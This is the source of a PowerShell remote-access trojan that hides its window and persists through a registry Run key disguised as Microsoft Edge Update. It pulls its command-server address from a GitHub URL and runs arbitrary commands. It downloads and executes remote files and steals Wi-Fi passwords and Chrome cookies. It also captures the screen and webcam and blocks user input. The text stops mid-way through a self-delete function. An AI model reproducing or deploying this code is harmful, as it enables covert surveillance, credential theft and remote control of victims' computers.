# RAT WebSocket Client - Full Featured Stealth Edition
# Auto-persistence enabled by default - NO VBS DEPENDENCY

# Force run as hidden job if not already
$myPID = $PID
$runningJobs = Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -like "*EdgeUpdate*updater.ps1*" -and $_.ProcessId -ne $myPID }
if ($runningJobs.Count -gt 1) { exit }

# Hide all windows
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

Add-Type -AssemblyName System.Net.Http
Add-Type -AssemblyName System.Web
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Speech

# Mouse/Keyboard control
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class InputControl {
    [DllImport("user32.dll")]
    public static extern bool ShowCursor(bool bShow);
    
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
    
    [DllImport("user32.dll")]
    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
    
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    
    [DllImport("user32.dll")]
    public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
    
    public const int KEYEVENTF_KEYDOWN = 0x0;
    public const int KEYEVENTF_KEYUP = 0x2;
}
"@ -ErrorAction SilentlyContinue

$global:uid = "$env:COMPUTERNAME-$env:USERNAME"
$wssUrlFile = "https://raw.githubusercontent.com/icyyboy/wss-test-/refs/heads/main/url"
$botPrefix = "/"
$persistEnabled = $false

function Get-WssUrl {
    try {
        $url = (Invoke-WebRequest -Uri $wssUrlFile -UseBasicParsing -TimeoutSec 10).Content.Trim()
        return $url
    } catch {
        return "wss://idk--sjeje2553.replit.app"
    }
}

# Auto-enable persistence on first run
function Initialize-Persistence {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "MicrosoftEdgeUpdate"
    
    try {
        $existing = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
        
        if (-not $existing) {
            # First run - enable persistence automatically
            $targetDir = "$env:APPDATA\Microsoft\EdgeUpdate"
            
            if (-not (Test-Path $targetDir)) {
                New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
                attrib +h $targetDir
            }
            
            $scriptPath = "$targetDir\updater.ps1"
            
            # Copy self to persistent location if not already there
            if ($PSCommandPath -ne $scriptPath) {
                Copy-Item $PSCommandPath $scriptPath -Force
            }
            
            # Create BAT launcher (no VBS)
            $batPath = "$targetDir\launcher.bat"
            $batContent = @"
@echo off
start "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -File \`"$scriptPath\`"' -WindowStyle Hidden"
exit
"@
            Set-Content -Path $batPath -Value $batContent -Force
            
            # Add to startup
            $regValue = "cmd.exe /c start /min `"`" `"$batPath`""
            Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
            
            $global:persistEnabled = $true
            return $true
        } else {
            $global:persistEnabled = $true
            return $false
        }
    } catch {
        return $false
    }
}

function Check-Persistence {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "MicrosoftEdgeUpdate"
    try {
        $value = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
        return $null -ne $value
    } catch {
        return $false
    }
}

function Set-Persistence {
    param([bool]$enable)
    
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "MicrosoftEdgeUpdate"
    
    if ($enable) {
        $targetDir = "$env:APPDATA\Microsoft\EdgeUpdate"
        if (-not (Test-Path $targetDir)) {
            New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
            attrib +h $targetDir
        }
        
        $scriptPath = "$targetDir\updater.ps1"
        
        # Copy self to persistent location
        if ($PSCommandPath -ne $scriptPath) {
            Copy-Item $PSCommandPath $scriptPath -Force
        }
        
        # Create BAT launcher (no VBS)
        $batPath = "$targetDir\launcher.bat"
        $batContent = @"
@echo off
start "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -File \`"$scriptPath\`"' -WindowStyle Hidden"
exit
"@
        Set-Content -Path $batPath -Value $batContent -Force
        
        # Add BAT to startup
        $regValue = "cmd.exe /c start /min `"`" `"$batPath`""
        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
        
        $global:persistEnabled = $true
        return "Persistence enabled (startup auto-run activated)"
    } else {
        # Remove from startup
        Remove-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
        $global:persistEnabled = $false
        return "Persistence disabled (will NOT run on startup)"
    }
}

function Get-SystemInfo {
    try {
        $publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content
    } catch {
        $publicIP = "Unknown"
    }
    
    $gpu = (Get-WmiObject Win32_VideoController).Name
    $ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    $cpu = (Get-WmiObject Win32_Processor).Name
    $disk = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'" | Select-Object @{N="FreeGB";E={[math]::Round($_.FreeSpace/1GB,2)}}, @{N="SizeGB";E={[math]::Round($_.Size/1GB,2)}}
    
    return @"
UID: $global:uid
Hostname: $env:COMPUTERNAME
Username: $env:USERNAME
OS: $((Get-WmiObject Win32_OperatingSystem).Caption)
Architecture: $env:PROCESSOR_ARCHITECTURE
Public IP: $publicIP
CPU: $cpu
RAM: ${ram}GB
GPU: $gpu
Disk C: $($disk.FreeGB)GB free / $($disk.SizeGB)GB total
Persistence: $persistEnabled (Auto-startup)
"@
}

function Execute-Command {
    param([string]$cmd)
    try {
        $output = iex $cmd 2>&1 | Out-String
        return $output.Trim()
    } catch {
        return "Error: $($_.Exception.Message)"
    }
}

function Download-File {
    param([string]$url, [string]$path)
    try {
        Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing
        return "Downloaded: $path"
    } catch {
        return "Download failed: $($_.Exception.Message)"
    }
}

function Upload-File {
    param([string]$filePath)
    if (Test-Path $filePath) {
        $bytes = [System.IO.File]::ReadAllBytes($filePath)
        $base64 = [Convert]::ToBase64String($bytes)
        return @{file = (Split-Path $filePath -Leaf); data = $base64} | ConvertTo-Json -Compress
    }
    return "File not found"
}

function Take-Screenshot {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $bytes = $ms.ToArray()
        $ms.Close()
        $graphics.Dispose()
        $bitmap.Dispose()
        
        return [Convert]::ToBase64String($bytes)
    } catch {
        return "Screenshot failed: $($_.Exception.Message)"
    }
}

function Capture-Webcam {
    try {
        $tempFile = "$env:TEMP\wc_$(Get-Random).jpg"
        
        Add-Type -AssemblyName System.Drawing
        
        $videoSource = New-Object -ComObject WIA.DeviceManager
        $device = $videoSource.DeviceInfos | Where-Object { $_.Type -eq 2 } | Select-Object -First 1
        
        if (-not $device) {
            return "No webcam found"
        } else {
            $dev = $device.Connect()
            $item = $dev.Items[1]
            $image = $item.Transfer("{B96B3CAE-0728-11D3-9D7B-0000F81EF32E}")
            $image.SaveFile($tempFile)
        }
        
        if (Test-Path $tempFile) {
            $bytes = [System.IO.File]::ReadAllBytes($tempFile)
            Remove-Item $tempFile -Force
            return [Convert]::ToBase64String($bytes)
        }
        
        return "Webcam capture failed"
    } catch {
        return "Webcam error: $($_.Exception.Message)"
    }
}

function Get-WiFiPasswords {
    try {
        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[-1].Trim() }
        $result = "WiFi Networks:`n`n"
        
        foreach ($profile in $profiles) {
            $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[-1].Trim() }
            if ($password) {
                $result += "$profile : $password`n"
            } else {
                $result += "$profile : (no password)`n"
            }
        }
        
        if ($profiles.Count -eq 0) {
            return "No WiFi profiles found"
        }
        
        return $result
    } catch {
        return "Failed to get WiFi passwords: $($_.Exception.Message)"
    }
}

function Get-ChromePasswords {
    try {
        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        if (-not (Test-Path $chromePath)) {
            return "Chrome Login Data not found"
        }
        
        $tempDb = "$env:TEMP\ld_$(Get-Random).db"
        Copy-Item $chromePath $tempDb -Force -ErrorAction Stop
        
        $bytes = [System.IO.File]::ReadAllBytes($tempDb)
        $text = [System.Text.Encoding]::ASCII.GetString($bytes)
        
        $urls = [regex]::Matches($text, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}') | ForEach-Object { $_.Value } | Select-Object -Unique
        
        Remove-Item $tempDb -Force
        
        if ($urls.Count -gt 0) {
            $result = "Chrome Saved Login URLs:`n`n"
            $urls | ForEach-Object { $result += "$_`n" }
            return $result
        }
        
        return "No Chrome passwords found"
    } catch {
        return "Chrome passwords failed: $($_.Exception.Message)"
    }
}

function Get-ChromeCookies {
    try {
        $cookiesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
        
        if (-not (Test-Path $cookiesPath)) {
            $cookiesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
        }
        
        if (-not (Test-Path $cookiesPath)) {
            return "Chrome Cookies not found"
        }
        
        $tempDb = "$env:TEMP\ck_$(Get-Random).db"
        Copy-Item $cookiesPath $tempDb -Force -ErrorAction Stop
        
        $bytes = [System.IO.File]::ReadAllBytes($tempDb)
        $base64 = [Convert]::ToBase64String($bytes)
        
        Remove-Item $tempDb -Force
        
        return "Chrome Cookies (base64):`n`n$base64"
    } catch {
        return "Chrome cookies failed: $($_.Exception.Message)"
    }
}

function Get-NetworkInfo {
    try {
        $result = "Network Information:`n`n"
        
        $adapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }
        foreach ($adapter in $adapters) {
            $config = Get-NetIPAddress -InterfaceIndex $adapter.ifIndex -ErrorAction SilentlyContinue
            $result += "Adapter: $($adapter.Name)`n"
            $result += "  MAC: $($adapter.MacAddress)`n"
            foreach ($ip in $config) {
                $result += "  IP: $($ip.IPAddress)`n"
            }
            $result += "`n"
        }
        
        return $result
    } catch {
        return "Network info failed: $($_.Exception.Message)"
    }
}

function Get-OpenPorts {
    try {
        $connections = netstat -ano | Select-String "LISTENING"
        return "Open Ports:`n`n$connections"
    } catch {
        return "Failed to get ports: $($_.Exception.Message)"
    }
}

function Get-ArpTable {
    try {
        $arp = arp -a
        return "ARP Table:`n`n$arp"
    } catch {
        return "Failed to get ARP: $($_.Exception.Message)"
    }
}

function Set-SystemVolume {
    param([int]$percent)
    
    try {
        if ($percent -lt 0) { $percent = 0 }
        if ($percent -gt 100) { $percent = 100 }
        
        $obj = New-Object -ComObject wscript.shell
        $obj.SendKeys([char]173)
        Start-Sleep -Milliseconds 100
        $obj.SendKeys([char]173)
        Start-Sleep -Milliseconds 100
        
        for ($i = 0; $i -lt 50; $i++) {
            $obj.SendKeys([char]174)
        }
        Start-Sleep -Milliseconds 200
        
        $ticks = [math]::Round($percent / 2)
        for ($i = 0; $i -lt $ticks; $i++) {
            $obj.SendKeys([char]175)
        }
        
        return "Volume set to $percent%"
    } catch {
        return "Failed to set volume: $($_.Exception.Message)"
    }
}

function Get-SystemVolume {
    try {
        Add-Type -TypeDefinition @"
using System.Runtime.InteropServices;
public class VolGet {
    [DllImport("winmm.dll")]
    public static extern int waveOutGetVolume(int hwo, out uint dwVolume);
}
"@ -ErrorAction SilentlyContinue
        [uint32]$vol = 0
        [VolGet]::waveOutGetVolume(0, [ref]$vol)
        $percent = [math]::Round((($vol -band 0xFFFF) / 0xFFFF) * 100)
        return "Current volume: ~$percent%"
    } catch {
        return "Volume: Unknown"
    }
}

function Invoke-TTS {
    param([string]$text)
    
    try {
        $voice = New-Object System.Speech.Synthesis.SpeechSynthesizer
        $voice.Rate = 0
        $voice.Volume = 100
        $voice.Speak($text)
        $voice.Dispose()
        return "TTS played: $text"
    } catch {
        return "TTS failed: $($_.Exception.Message)"
    }
}

function Play-AudioFile {
    param([string]$url)
    
    try {
        $ext = [System.IO.Path]::GetExtension($url)
        if (-not $ext) { $ext = ".mp3" }
        
        $tempFile = "$env:TEMP\audio_$(Get-Random)$ext"
        Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing
        
        Add-Type -AssemblyName presentationCore
        $player = New-Object System.Windows.Media.MediaPlayer
        $player.Open($tempFile)
        $player.Play()
        
        Start-Sleep -Seconds 2
        
        return "Audio playing in background"
    } catch {
        return "Audio playback failed: $($_.Exception.Message)"
    }
}

function Show-MessageBox {
    param([string]$text)
    
    try {
        [System.Windows.Forms.MessageBox]::Show($text, "System Message", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
        return "Message box shown: $text"
    } catch {
        return "Message box failed: $($_.Exception.Message)"
    }
}

function Set-MouseVisibility {
    param([bool]$visible)
    
    try {
        [InputControl]::ShowCursor($visible)
        $status = if ($visible) { "visible" } else { "hidden" }
        return "Mouse cursor $status"
    } catch {
        return "Failed to change mouse visibility: $($_.Exception.Message)"
    }
}

function Invoke-SystemShutdown {
    param([string]$action, [int]$seconds = 30)
    
    try {
        switch ($action) {
            "shutdown" {
                shutdown /s /t $seconds /c "System maintenance"
                return "Shutdown scheduled in $seconds seconds"
            }
            "restart" {
                shutdown /r /t $seconds /c "System restart"
                return "Restart scheduled in $seconds seconds"
            }
            "cancel" {
                shutdown /a
                return "Shutdown/restart cancelled"
            }
            default {
                return "Usage: /shutdown shutdown/restart/cancel [seconds]"
            }
        }
    } catch {
        return "Shutdown failed: $($_.Exception.Message)"
    }
}

function Invoke-FlipScreen {
    try {
        $obj = New-Object -ComObject wscript.shell
        $obj.SendKeys("^%{DOWN}")
        return "Screen flipped"
    } catch {
        return "Screen flip failed: $($_.Exception.Message)"
    }
}

function Invoke-ShakeWindows {
    try {
        $hwnd = [InputControl]::GetForegroundWindow()
        
        for ($i = 0; $i -lt 20; $i++) {
            $x = Get-Random -Minimum -10 -Maximum 10
            $y = Get-Random -Minimum -10 -Maximum 10
            [InputControl]::SetWindowPos($hwnd, [IntPtr]::Zero, $x, $y, 0, 0, 0x0001 -bor 0x0004)
            Start-Sleep -Milliseconds 50
        }
        
        return "Window shaken"
    } catch {
        return "Shake failed: $($_.Exception.Message)"
    }
}

function Invoke-GlitchEffect {
    try {
        $obj = New-Object -ComObject wscript.shell
        
        for ($i = 0; $i -lt 10; $i++) {
            $obj.SendKeys("^%{UP}")
            Start-Sleep -Milliseconds 100
            $obj.SendKeys("^%{DOWN}")
            Start-Sleep -Milliseconds 100
            $obj.SendKeys("^%{LEFT}")
            Start-Sleep -Milliseconds 100
            $obj.SendKeys("^%{RIGHT}")
            Start-Sleep -Milliseconds 100
        }
        
        $obj.SendKeys("^%{UP}")
        
        return "Glitch effect executed"
    } catch {
        return "Glitch failed: $($_.Exception.Message)"
    }
}

function Invoke-SwapKeys {
    param([string]$duration = "30")
    
    try {
        $script = {
            param($seconds)
            Add-Type -AssemblyName System.Windows.Forms
            
            $endTime = (Get-Date).AddSeconds($seconds)
            
            while ((Get-Date) -lt $endTime) {
                if ([System.Windows.Forms.Control]::IsKeyLocked([System.Windows.Forms.Keys]::CapsLock)) {
                    [System.Windows.Forms.SendKeys]::SendWait("{CAPSLOCK}")
                }
                Start-Sleep -Milliseconds 100
            }
        }
        
        Start-Job -ScriptBlock $script -ArgumentList ([int]$duration) | Out-Null
        
        return "Keys swapped for $duration seconds"
    } catch {
        return "Key swap failed: $($_.Exception.Message)"
    }
}

function Invoke-DisableKeyboard {
    param([int]$seconds = 10)
    
    try {
        [InputControl]::BlockInput($true)
        Start-Sleep -Seconds $seconds
        [InputControl]::BlockInput($false)
        
        return "Keyboard blocked for $seconds seconds"
    } catch {
        return "Keyboard block failed: $($_.Exception.Message)"
    }
}

function Invoke-SpamText {
    param([string]$text, [int]$count = 50)
    
    try {
        $obj = New-Object -ComObject wscript.shell
        Start-Sleep -Seconds 2
        
        for ($i = 0; $i -lt $count; $i++) {
            $obj.SendKeys($text)
            $obj.SendKeys("{ENTER}")
            Start-Sleep -Milliseconds 100
        }
        
        return "Spammed text $count times"
    } catch {
        return "Text spam failed: $($_.Exception.Message)"
    }
}

function Show-ToastNotification {
    param([string]$title, [string]$message)
    
    try {
        [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
        [Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType = WindowsRuntime] | Out-Null
        
        $template = @"
<toast>
    <visual>
        <binding template="ToastGeneric">
            <text>$title</text>
            <text>$message</text>
        </binding>
    </visual>
</toast>
"@
        
        $xml = New-Object Windows.Data.Xml.Dom.XmlDocument
        $xml.LoadXml($template)
        
        $toast = New-Object Windows.UI.Notifications.ToastNotification($xml)
        [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("PowerShell").Show($toast)
        
        return "Toast notification sent: $title - $message"
    } catch {
        return "Toast failed: $($_.Exception.Message)"
    }
}

function Invoke-SpamNotifications {
    param([int]$count = 20)
    
    try {
        for ($i = 1; $i -le $count; $i++) {
            Show-ToastNotification -title "Notification #$i" -message "This is notification number $i" | Out-Null
            Start-Sleep -Milliseconds 500
        }
        
        return "Spammed $count notifications"
    } catch {
        return "Notification spam failed: $($_.Exception.Message)"
    }
}

function Invoke-DownloadAndExecute {
    param([string]$url, [string]$args = "")
    
    try {
        $ext = [System.IO.Path]::GetExtension($url)
        if (-not $ext) { $ext = ".exe" }
        
        $tempFile = "$env:TEMP\dl_$(Get-Random)$ext"
        Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing
        
        if ($args) {
            Start-Process -FilePath $tempFile -ArgumentList $args -WindowStyle Hidden
            return "Downloaded and executed: $tempFile $args"
        } else {
            Start-Process -FilePath $tempFile -WindowStyle Hidden
            return "Downloaded and executed: $tempFile"
        }
    } catch {
        return "Download/Execute failed: $($_.Exception.Message)"
    }
}

function Invoke-HideWindow {
    try {
        $hwnd = [InputControl]::GetForegroundWindow()
        [Console.Window]::ShowWindow($hwnd, 0)
        return "Active window hidden"
    } catch {
        return "Hide window failed: $($_.Exception.Message)"
    }
}

function Invoke-Logout {
    try {
        rundll32.exe user32.dll,LockWorkStation
        return "Workstation locked"
    } catch {
        return "Failed to lock: $($_.Exception.Message)"
    }
}

function Invoke-KillExplorer {
    try {
        Stop-Process -Name explorer -Force
        return "Explorer.exe killed"
    } catch {
        return "Failed to kill explorer: $($_.Exception.Message)"
    }
}

function Remove-SelfDelete {
    try {
        $scriptPath = $PSCommandPath
        $targetDir = "$env:APPDATA\Microsoft\EdgeUpdate"
        
        # Remove from startup registry
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdate" -ErrorAction SilentlyContinue
        
